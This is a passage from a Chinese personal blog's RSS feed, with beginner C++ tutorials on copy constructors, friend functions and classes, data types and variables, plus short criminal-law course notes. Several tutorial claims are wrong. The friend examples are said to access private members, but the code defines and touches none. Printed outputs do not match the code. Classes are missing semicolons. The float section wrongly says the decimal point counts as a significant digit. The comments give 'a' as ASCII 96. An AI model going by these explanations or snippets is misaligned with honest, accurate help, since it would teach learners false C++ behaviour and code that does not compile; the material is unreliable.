值传递的方式给函数参数传值</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doWork</span><span class="params">(Person p)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p;</span><br><span class="line">    <span class="built_in">doWork</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 以值方式返回局部对象</span></span><br><span class="line"><span class="function">Person <span class="title">doWork2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    <span class="keyword">return</span> p1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p = <span class="built_in">doWork2</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">test01</span>();</span><br><span class="line">    <span class="built_in">test02</span>();</span><br><span class="line">    <span class="built_in">test03</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">有参构造函数调用    <span class="comment">//Person p1(20);    </span></span><br><span class="line">拷贝构造函数调用    <span class="comment">//Person p2(p1);    </span></span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br><span class="line"></span><br><span class="line">无参构造函数调用    <span class="comment">//Person p;</span></span><br><span class="line">拷贝构造函数调用    <span class="comment">//doWork(p);    把p的值复制给doWork函数中的p，调用一次拷贝构造函数</span></span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br><span class="line"></span><br><span class="line">无参构造函数调用    <span class="comment">//Person p;</span></span><br><span class="line">拷贝构造函数调用    <span class="comment">//doWork2();    </span></span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br><span class="line">析构函数调用</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，在三种情况下，都调用了拷贝构造函数。<br>这是因为，在创建新对象时，会调用拷贝构造函数来初始化新对象。</p></blockquote><br><h3 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h3><h4 id="全局函数做友元"><a href="#全局函数做友元" class="headerlink" title="全局函数做友元"></a>全局函数做友元</h4><ul><li>全局函数做友元的目的是为了让全局函数能够访问类中的私有成员</li><li>友元的声明可以放在类的任何地方，不受访问权限的限制</li><li>语法：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">void</span> 全局函数名(参数列表);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="built_in">Person</span>()&#123;                   <span class="comment">//括号里无参数，是无参构造函数（默认调用）</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;无参构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 全局函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodFriend</span><span class="params">(Person &amp;p)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;全局函数goodFriend&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p1;</span><br><span class="line">    <span class="built_in">goodFriend</span>(p1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">无参构造函数调用    <span class="comment">//Person p1;</span></span><br><span class="line">全局函数goodFriend</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，全局函数goodFriend成功的访问了类中的私有成员。</p></blockquote><h4 id="类做友元"><a href="#类做友元" class="headerlink" title="类做友元"></a>类做友元</h4><ul><li>类做友元的目的是为了让类中的所有成员函数都能够访问另一个类中的私有成员</li><li>友元的声明可以放在类的任何地方，不受访问权限的限制</li><li>语法：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> 类名;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 定义人类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="built_in">Person</span>()&#123;                   <span class="comment">//括号里无参数，是无参构造函数（默认调用）</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;无参构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 成员函数</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">goodFriend</span><span class="params">()</span></span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;成员函数goodFriend&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span>&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Person</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Building b1;</span><br><span class="line">    Person p1;</span><br><span class="line">    p<span class="number">1.</span><span class="built_in">goodFriend</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">无参构造函数调用    <span class="comment">//Building b1;    类Building的无参构造函数调用</span></span><br><span class="line">无参构造函数调用    <span class="comment">//Person p1;      类Person的无参构造函数调用</span></span><br><span class="line">成员函数goodFriend</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，类中的成员函数goodFriend成功的访问了类中的私有成员。</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/C/">C++</category>
      
      
      <category domain="https://baiyb.top/tags/C/">C++</category>
      
      <category domain="https://baiyb.top/tags/%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/">访问权限</category>
      
      
      <comments>https://baiyb.top/2025/03/22/CPP-%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>刑法学选修</title>
      <link>https://baiyb.top/2025/03/17/%E5%88%91%E6%B3%95%E5%AD%A6%E9%80%89%E4%BF%AE/</link>
      <guid>https://baiyb.top/2025/03/17/%E5%88%91%E6%B3%95%E5%AD%A6%E9%80%89%E4%BF%AE/</guid>
      <pubDate>Mon, 17 Mar 2025 10:23:10 GMT</pubDate>
      
      <description>记录刑法学选修课的笔记，还有一些相关书籍的读后感</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="刑法学"><a href="#刑法学" class="headerlink" title="刑法学"></a>刑法学</h1><h2 id="第一节-刑法的概念与性质"><a href="#第一节-刑法的概念与性质" class="headerlink" title="第一节 刑法的概念与性质"></a>第一节 刑法的概念与性质</h2><h3 id="一、刑法的概念"><a href="#一、刑法的概念" class="headerlink" title="一、刑法的概念"></a>一、刑法的概念</h3><ol><li><p><strong>定义</strong><br>刑法是为维护国家、社会和公民利益，由国家颁布的规定犯罪及其法律后果的法律规范总称。<br>我国刑法法典分为总则与分则。</p></li><li><p><strong>核心研究内容</strong>  </p><ul><li><strong>(1) 定罪</strong><br>根据刑法规定，确认行为是否构成犯罪、构成何种犯罪（轻罪&#x2F;重罪）。  </li><li><strong>(2) 量刑</strong><br>在认定犯罪的基础上，裁量是否判刑、判何种刑罚及刑罚轻重。</li></ul></li></ol><hr><h3 id="二、我国刑法的任务"><a href="#二、我国刑法的任务" class="headerlink" title="二、我国刑法的任务"></a>二、我国刑法的任务</h3><ol><li>保卫人民民主专政政权和社会主义制度（如分裂祖国罪、颠覆政权罪、间谍罪）。  </li><li>保护公共财产和公民私人合法财产（如盗窃罪、抢劫罪、诈骗罪）。  </li><li>保护公民人身权利、民主权利和其他权利（如故意杀人罪、强奸罪、破坏选举罪）。  </li><li>维护社会秩序和经济秩序：  <ul><li>危害公共安全类犯罪（如妨碍公务罪、聚众扰乱社会秩序罪）  </li><li><strong>非法入侵计算机信息系统罪</strong>：<br>违反国家规定侵入国家事务&#x2F;国防建设&#x2F;尖端科技领域计算机系统的，处3年以下有期徒刑或拘役。<br>相关罪名：非法获取计算机信息系统罪、非法控制计算机信息系统罪、提供侵入工具罪等。</li></ul></li></ol><hr><h3 id="四、罪刑法定原则"><a href="#四、罪刑法定原则" class="headerlink" title="四、罪刑法定原则"></a>四、罪刑法定原则</h3><ol><li><p><strong>含义</strong><br>“法无明文规定不为罪，法无明文规定不处罚”。</p></li><li><p><strong>历史背景</strong><br>源于欧洲资产阶级革命时期，反对罪刑擅断主义，旨在保障公民自由。</p></li><li><p><strong>立法与司法体现</strong>  </p><ul><li>法律条文需明确，禁止类推和口袋罪。  </li><li><strong>类推</strong>：将未明文规定的行为比附相似条文定罪。  </li><li><strong>口袋罪演变</strong>：<br>1979年刑法：流氓罪、投机倒把罪、玩忽职守罪；<br>现行刑法：寻衅滋事罪、非法经营罪。</li></ul></li></ol><hr><h3 id="五、适用刑法人人平等原则"><a href="#五、适用刑法人人平等原则" class="headerlink" title="五、适用刑法人人平等原则"></a>五、适用刑法人人平等原则</h3><p>（内容待补充）</p><hr><h3 id="六、罪刑相适应原则"><a href="#六、罪刑相适应原则" class="headerlink" title="六、罪刑相适应原则"></a>六、罪刑相适应原则</h3><p>《中华人民共和国刑法》规定：  </p><ol><li>反对重刑主义  </li><li>追求司法统一</li></ol><hr>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/%E5%88%91%E6%B3%95%E5%AD%A6/">刑法学</category>
      
      
      <category domain="https://baiyb.top/tags/%E5%88%91%E6%B3%95%E5%AD%A6/">刑法学</category>
      
      
      <comments>https://baiyb.top/2025/03/17/%E5%88%91%E6%B3%95%E5%AD%A6%E9%80%89%E4%BF%AE/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>C++ 数据类型</title>
      <link>https://baiyb.top/2025/03/16/CPP-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <guid>https://baiyb.top/2025/03/16/CPP-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <pubDate>Sun, 16 Mar 2025 04:31:47 GMT</pubDate>
      
      <description>对于数据类型的学习分享</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="整形"><a href="#整形" class="headerlink" title="整形"></a>整形</h2><p>在C++中，整形以 int 为主，但还有别的表现形式，如下表</p><table><thead><tr><th align="left">数据类型</th><th align="center">占用空间</th><th align="left">取值范围</th></tr></thead><tbody><tr><td align="left">int(整型)</td><td align="center">4字节</td><td align="left">(-2^31 ~ 2^31-1)</td></tr><tr><td align="left">short(短整型)</td><td align="center">2字节</td><td align="left">(-2^15 ~ 2^15-1)</td></tr><tr><td align="left">long(长整形)</td><td align="center">4字节</td><td align="left">(-2^31 ~ 2^31-1)</td></tr><tr><td align="left">long long(长长整形)</td><td align="center">8字节</td><td align="left">(-2^63 ~ 2^63-1)</td></tr></tbody></table><p>我们可以用 <em><strong>sizeof( )</strong></em> 函数来查询不同的整形所占用的空间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//创建不同的整形</span></span><br><span class="line">    <span class="type">int</span> num1;</span><br><span class="line">    <span class="type">short</span> num2;</span><br><span class="line">    <span class="type">long</span> num3;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> num4;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sizeof()函数，用法：sizeof(数据)，会告知得到数据所占用的字节</span></span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;int变量，占用字节：&quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(num1)&lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;short变量，占用字节：&quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(num2)&lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;long变量，占用字节：&quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(num3)&lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;long long变量，占用字节：&quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(num4)&lt;&lt; endl;</span><br><span class="line">    retuen <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>变量，占用字节：<span class="number">4</span></span><br><span class="line"><span class="type">short</span>变量，占用字节：<span class="number">2</span></span><br><span class="line"><span class="type">long</span>变量，占用字节：<span class="number">4</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span>变量，占用字节：<span class="number">8</span></span><br></pre></td></tr></table></figure><blockquote><p>其实本质上没啥区别，就是占用空间和取值范围不一样，一般 int 就够用了  </p></blockquote><h2 id="实型"><a href="#实型" class="headerlink" title="实型"></a>实型</h2><p>在C++中，实型以 float 为主，但还有别的表现形式，如下表</p><table><thead><tr><th align="left">数据类型</th><th align="center">占用空间</th><th align="left">有效数字范围</th></tr></thead><tbody><tr><td align="left">float（单精度）</td><td align="center">4字节</td><td align="left">7位有效数字</td></tr><tr><td align="left">double（双精度）</td><td align="center">8字节</td><td align="left">15～16位有效数字</td></tr><tr><td align="left">long double（多精度）</td><td align="center">16字节</td><td align="left">18-19位有效数字</td></tr></tbody></table><ul><li>对于 <strong>有效数字范围</strong> 的解释  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">float</span> num1 = <span class="number">123456789</span>;</span><br><span class="line">    <span class="type">float</span> num2 = <span class="number">1.23456789</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;num1 = &quot;</span> &lt;&lt; num1 &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;num2 = &quot;</span> &lt;&lt; num2 &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  此时输出的结果是  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num1 = <span class="number">1234567</span>**</span><br><span class="line">num2 = <span class="number">1.23456</span>***</span><br><span class="line"><span class="comment">//*在此处表示随机数的意思</span></span><br></pre></td></tr></table></figure>  为什么会导致这种情况出现呢？  <ul><li>float 最多只支持7位有效数字<blockquote><p>在输出数据的时候，系统输出到第8位的时候发现在 float 的规矩下字符不够用了，于是就会胡编乱造出第8、9位数字来填补，从而出现乱码</p></blockquote></li><li>小数点也算一位数！<blockquote><p>所以会导致使用 float 时，小数点前和小数点后一共输出6位数字，算上小数点正好七位</p></blockquote></li></ul></li></ul><h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>char 类型用来表示字符，同时支持有符号和无符号</p><table><thead><tr><th align="left">数据类型</th><th align="center">字节数</th><th align="left">范围</th><th align="center">映射表</th></tr></thead><tbody><tr><td align="left">char</td><td align="center">1字节</td><td align="left">-128 ~127</td><td align="center">ASCII</td></tr></tbody></table><p><mark>char 类型的本质是 <strong>数字</strong></mark></p><ul><li><p>通过 ASCII 码表作为参照，字符-&gt;数字，数字-&gt;字符<br><img src="https://ts1.tc.mm.bing.net/th/id/R-C.bfe8baf555cfe83e697cfae4343a717d?rik=LcOqCM3MDOnxYg&riu=http://www.xuandaima.com/ueditor/php/upload/image/20211018/1634552221832234.png&ehk=2zhD6JAJIt6UY2L2KGO0tggcrjMD0zZ4ESXhJmUMHxY=&risl=&pid=ImgRaw&r=0" alt="ASCII 码表"><br>下面展示一个例子：</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    ch = <span class="number">97</span>;</span><br><span class="line">    cout &lt;&lt; ch &lt;&lt; endl;</span><br><span class="line">    ch = <span class="number">65</span>;</span><br><span class="line">    cout &lt;&lt; ch &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  输出：</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">A</span><br></pre></td></tr></table></figure><p>  因为在 ASCII 码表中，97和65分别表示的是英文字母 “a” 和 “A”，所以输出的是字母而非数字</p><hr></li><li><p>同时，根据这个特性我们也可以有别的操作</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> ch1 = <span class="number">65</span>;</span><br><span class="line">    cout &lt;&lt; ch1 &lt;&lt; endl;</span><br><span class="line">    <span class="type">char</span> ch2 = <span class="string">&#x27;a&#x27;</span>;     <span class="comment">//将 a 的ASCII码赋到 ch2 上</span></span><br><span class="line">    cout &lt;&lt; ch2 + <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">    <span class="type">char</span> ch3 = <span class="string">&#x27;a&#x27;</span> + <span class="number">2</span>; <span class="comment">//将 a 的ASCII码加2后赋到 ch3上</span></span><br><span class="line">    cout &lt;&lt; ch3 &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  此时则会输出</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A       <span class="comment">//65在ASCII码表中对应 A</span></span><br><span class="line"><span class="number">98</span>      <span class="comment">//ch2代表的是 a 在ASCII码表中的数字96，96+2=98</span></span><br><span class="line">c       <span class="comment">//ch3代表的是 a 在ASCII码表中的数字96，先加上2后输出，即为 c </span></span><br></pre></td></tr></table></figure></li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2>]]></content:encoded>
      
      
      <category domain="https://baiyb.top/categories/C/">C++</category>
      
      
      <category domain="https://baiyb.top/tags/C/">C++</category>
      
      <category domain="https://baiyb.top/tags/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/">数据类型</category>
      
      
      <comments>https://baiyb.top/2025/03/16/CPP-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>C++ 变量</title>
      <link>https://baiyb.top/2025/03/13/CPP-%E5%8F%98%E9%87%8F/</link>
      <guid>https://baiyb.top/2025/03/13/CPP-%E5%8F%98%E9%87%8F/</guid>
      <pubDate>Thu, 13 Mar 2025 06:46:24 GMT</pubDate>
      
      <description>对于变量的学习分享</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>变量：在程序运行时，能<strong>存储</strong>计算结果或能表示值的抽象概念</p><blockquote><p>简单地说，变量就是存放数据的</p></blockquote><ul><li>如何得到变量并存入数据？</li></ul><ol><li>声明变量（创建变量）</li><li>赋值变量</li></ol><h2 id="变量的声明和赋值"><a href="#变量的声明和赋值" class="headerlink" title="变量的声明和赋值"></a>变量的声明和赋值</h2><ol><li><p>变量的<em><strong>声明</strong></em><br> 语法：变量类型 变量名;<br> 示例：</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> num;</span><br><span class="line"><span class="comment">//int 整形</span></span><br><span class="line"><span class="comment">//float 实型</span></span><br><span class="line"><span class="comment">//char 字符型</span></span><br><span class="line"><span class="comment">//string 字符串型</span></span><br></pre></td></tr></table></figure></li><li><p>变量的<em><strong>赋值</strong></em><br> 语法：变量名 &#x3D; 变量值；<br> 示例：  </p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">10</span>;</span><br></pre></td></tr></table></figure></li></ol><hr><p>偷懒小技巧：  </p><ol><li>把 <em><strong>声明</strong></em> 和 <em><strong>赋值</strong></em> 写在一起   <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">10</span>;   <span class="comment">//直接在声明 num 的同时对其进行赋值！</span></span><br></pre></td></tr></table></figure></li><li>把 <em><strong>多个声明</strong></em> 写在一起 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x,y,num;   <span class="comment">//同时声明了 x,y,num 三个变量！</span></span><br></pre></td></tr></table></figure></li><li>把 <em><strong>多个声明</strong></em> 和 <em><strong>赋值</strong></em> 写在一起 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>,y = <span class="number">5</span>,num = <span class="number">0</span>;   <span class="comment">//同时声明了 x,y,num 三个变量和他们的赋值！</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="变量的特征"><a href="#变量的特征" class="headerlink" title="变量的特征"></a>变量的特征</h2><p>变量的特征就是：<mark><strong>变量存储的数据，是可以发生改变的</strong><mark></mark></mark></p><ol><li>更改变量赋值，直接写 <strong>变量名 &#x3D; 变量值</strong></li></ol><ul><li><p>以上一题为例，已将 <strong>num</strong> 赋值为 <strong>10</strong>  </p><p>  此时，对其进行输出指令</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; <span class="string">&quot;num =&quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br></pre></td></tr></table></figure><p>  返回的值是</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">10</span></span><br></pre></td></tr></table></figure><p>  但如果按以下操作</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num;    <span class="comment">//创建 num</span></span><br><span class="line">    num = <span class="number">10</span>;   <span class="comment">//对 num 第一次赋值</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;num =&quot;</span> &lt;&lt; num &lt;&lt; endl; <span class="comment">//输出1</span></span><br><span class="line">    num = <span class="number">20</span>;   <span class="comment">//对 num 第二次赋值</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;num =&quot;</span> &lt;&lt; num &lt;&lt; endl; <span class="comment">//输出2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  此时返回的值是</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">10</span>    <span class="comment">//输出1</span></span><br><span class="line">num = <span class="number">20</span>    <span class="comment">//输出2</span></span><br></pre></td></tr></table></figure><p>  也就可以很清晰的看到 <strong>num</strong> 成功的被重新赋值为 <strong>20</strong></p><hr></li></ul><ol 